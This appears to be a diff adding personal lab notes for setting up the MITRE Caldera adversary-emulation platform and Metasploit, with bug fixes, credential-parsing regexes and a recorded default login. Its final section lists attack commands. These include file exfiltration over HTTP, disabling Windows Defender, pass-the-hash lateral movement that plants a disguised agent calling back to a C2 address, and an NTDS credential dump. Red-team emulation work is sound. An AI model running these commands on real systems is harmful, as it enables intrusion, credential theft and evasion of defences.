@@ -1,0 +1,137 @@
+caldera setup
+- git clone https://github.com/mitre/caldera.git --recursive
+- cd caldera
+- pip3 install -r requirements.txt
+https://blog.csdn.net/weixin_39732538/article/details/129748951
+
+
+- Install golang 1.19 and above: https://go.dev/wiki/Ubuntu - Tested with 1.22
+- Install nodejs v18: 
+https://github.com/mitre/caldera/issues/2886
+- Set VITE_CALDERA_URL env to http://
+python3 server.py --insecure --build
+
+sudo apt-get install upx
+pip install donut-shellcode
+
+Magma installation
+Go to plugins/magma
+- npm install
+- npm run build
+
+Exfiltration fix solution
+https://github.com/mitre/caldera/issues/2786
+
+Builder Plugin fixes
+- Add user to docker group
+- run install.sh in plugin folder
+- Setup proxy (if required): https://stackoverflow.com/questions/23111631/cannot-download-docker-images-behind-a-proxy
+	- mkdir /etc/systemd/system/docker.service.d
+	- echo "[Service]\nEnvironment=\"HTTP_PROXY=http://proxy.example.com:80/\"\nEnvironment=\"HTTPS_PROXY=http://proxy.example.com:80/\"" > /etc/systemd/system/docker.service.d/http-proxy.conf
+	- sudo systemctl daemon-reload
+	- sudo systemctl restart docker
+- docker image pull mono:latest dockcross/windows-static-x64:latest golang:latest
+
+Emu Plugin fixes
+- sudo apt install unzip
+- pip install -r requirements.txt (install pyminizip)
+- after starting caldera up one time, then run download_payloads.sh
+
+Install pathfinder plugin
+git clone https://github.com/center-for-threat-informed-defense/caldera_pathfinder.git pathfinder --recursive
+vi plugins/magma/src/views/PluginView.vue --> Remove localhost and replace with ip address
+--- Don't need to install
+
+----Install caldera as a service-----
+sudo vi /etc/systemd/system/caldera.service
+
+[Unit]
+Description=Operates the Caldera Server
+
+[Service]
+User=ai_lincoln
+WorkingDirectory=/opt/caldera
+ExecStart=/anaconda3/bin/python server.py -l DEBUG
+# optional items below
+RemainAfterExit=yes
+KillSignal=SIGINT
+
+sudo systemctl daemon-reload
+sudo systemctl start caldera
+https://github.com/mitre/caldera/issues/3018 - Reason to add the kill signal 
+
+
+Metasploit Installation
+- sudo apt-get install build-essential zlib1g zlib1g-dev libxml2 libxml2-dev libxslt-dev locate libreadline6-dev libcurl4-openssl-dev git-core autoconf curl postgresql postgresql-contrib libpq-dev libapr1 libaprutil1 libsvn1 libpcap-dev ruby ruby-dev
+
+- cd /opt; sudo git clone https://github.com/rapid7/metasploit-framework.git
+- sudo chown ; sudo chmod 775
+- sudo bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
+- gem install bundler
+- bundle install
+https://fedoraproject.org/wiki/Metasploit_Postgres_Setup
+- Test db: msfconsole; db_connect msf_user:password@127.0.0.1:5432/msf_database
+- Create database.yml, sudo su postgres; psql; ALTER USER msf_user WITH Create Role;
+- msfdb init --connection-string="postgres://msf_user:password@127.0.0.1:5432/msf_database"
+
+============ Configurations to take note =========
+- sandcat name in crackmapexec abilities: splunk<ip>
+- change IP address in VITE_CONFIG_JS and config files
+
+########## Bug Fixes ###########
+- Graph issues
+	- Add exception statement to v2/handlers/operation.py
+	- Added handler for "None" values in agent after agents are terminated 
+
+
+
+Login: red:admin
+APIKey: ADMIN123
+
+
+
+
+Linkid issue
+replace_origin_link_id (inside c_link)
+	- realise this is where the origin_link_id gets replaced;
+app/api/v2/managers/operation_api_manager.py
+	- saw the other global variables are being substituted
+app/objects/secondclass/c_link.py
+	- added command to change the plaintext_command during replace_origin_link_id
+app/objects/c_agent.py
+templates/operations.html
+	- Realised that the issue is with the frontend, not the backend. Sending a command via a curl request works successfully
+	- Scared to "Rebuild" caldera to wipe the operations; will not continue to work on this and focus on other tasks
+
+
+
+
+
+
+
+
+
+
+
+
+============ Parser Regex ==================
+\s*\*\sUsername\s*:\s*(\S+).*[\r\n]+.*Domain\s*:\s*(\S+)[\r\n]+.*\s*\*\sPassword\s*:\s*(.+)
+\s*\*\sUsername\s*:\s*(\S+).*[\r\n]+.*Domain\s*:\s*(\S+)[\r\n]+.*\s*\*\sNTLM\s*:\s*(.+)
+
+\s*\*\sUsername\s*:\s*(\S+).*\d[1,3]
+
+
+Domain\s*:\s*(\S+).*
+
+\s*\*\sPassword\s*:\s*(.+)
+
+
+======================= Test Commands ====================
+Caldera Exfiltration over HTTP
+curl -X "POST" -F "data=@#{file.name}" http://#{server}/file/upload
+
+Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;
+
+crackmapexec -u ladmin -H aad3b433b51404eeaad3b435b51404ee:c17e68bd425d20c9d9df388bad7285a1 -d WORKGROUP -X "Start-Process -FilePath C:\Users\Public\splunkd1.exe -ArgumentList \"-server http://192.168.81.23:8888 -group red_in\" -WindowStyle hidden" --upload splunkd.exe \\Users\\Public\\splunkd1.exe 10.0.11.100
+
+mkdir C:\Windows\Temp\ntds_T1003 && ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
